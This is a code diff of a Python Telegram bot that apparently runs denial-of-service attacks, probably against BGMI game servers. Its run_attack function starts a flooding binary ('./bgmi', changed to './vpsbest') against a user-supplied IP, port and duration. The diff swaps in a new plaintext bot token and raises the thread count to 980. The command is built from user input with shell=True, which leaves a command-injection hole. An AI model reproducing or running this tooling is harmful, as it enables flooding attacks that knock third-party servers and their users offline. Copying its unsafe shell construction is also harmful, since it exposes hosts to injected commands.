@@ -10,7 +10,7 @@ import random
 import string
 
 # Bot token
-BOT_TOKEN = '7815165696:AAFLRos3L-CvxXhmQpN82u3TDSxxLfhR5kA'  # Replace with your bot token
+BOT_TOKEN = '7815165696:AAHUgqY2LRXCJFTBedcutCbpGpEQ7KkxQXk'  # Replace with your bot token
 
 # Admin ID
 ADMIN_ID = 1094467055
@@ -728,7 +728,7 @@ async def run_attack(ip, port, time_duration, update, user_id):
     global current_attack_user, current_attack_end_time, attack_cooldown
 
     try:
-        command = f"./bgmi {ip} {port} {time_duration} {350} {default_thread}"
+        command = f"./vpsbest {ip} {port} {time_duration} {16} {default_thread}"
         process = subprocess.Popen(command, shell=True)
 
         await asyncio.sleep(time_duration)
@@ -756,7 +756,7 @@ async def run_attack(ip, port, time_duration, update, user_id):
         await update.message.reply_text(f"⚠️ *Attack Error:* {str(e)}", parse_mode="Markdown")
     
 # Default thread value
-default_thread = "300"
+default_thread = "980"
 
 # Command to set thread dynamically
 async def set_thread(update: Update, context: ContextTypes.DEFAULT_TYPE):
